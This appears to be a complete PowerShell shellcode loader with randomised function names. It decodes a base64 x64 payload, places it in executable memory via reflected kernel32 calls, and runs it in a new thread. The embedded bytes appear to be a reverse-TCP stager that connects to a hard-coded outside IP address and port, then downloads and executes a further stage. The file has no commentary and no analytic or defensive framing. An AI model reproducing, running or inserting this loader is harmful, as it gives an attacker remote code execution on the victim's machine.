function wVd {
	Param ($r4wCh, $bGNZ)		
	$zcO = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $zcO.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($zcO.GetMethod('GetModuleHandle')).Invoke($null, @($r4wCh)))), $bGNZ))
}

function fS6 {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $dg,
		[Parameter(Position = 1)] [Type] $vl = [Void]
	)
	
	$p4JlV = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$p4JlV.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $dg).SetImplementationFlags('Runtime, Managed')
	$p4JlV.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $vl, $dg).SetImplementationFlags('Runtime, Managed')
	
	return $p4JlV.CreateType()
}

[Byte[]]$mYY4l = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAkeL2tSMUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
		
$xk = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((wVd kernel32.dll VirtualAlloc), (fS6 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $mYY4l.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($mYY4l, 0, $xk, $mYY4l.length)

$eA5 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((wVd kernel32.dll CreateThread), (fS6 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$xk,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((wVd kernel32.dll WaitForSingleObject), (fS6 @([IntPtr], [Int32]))).Invoke($eA5,0xffffffff) | Out-Null
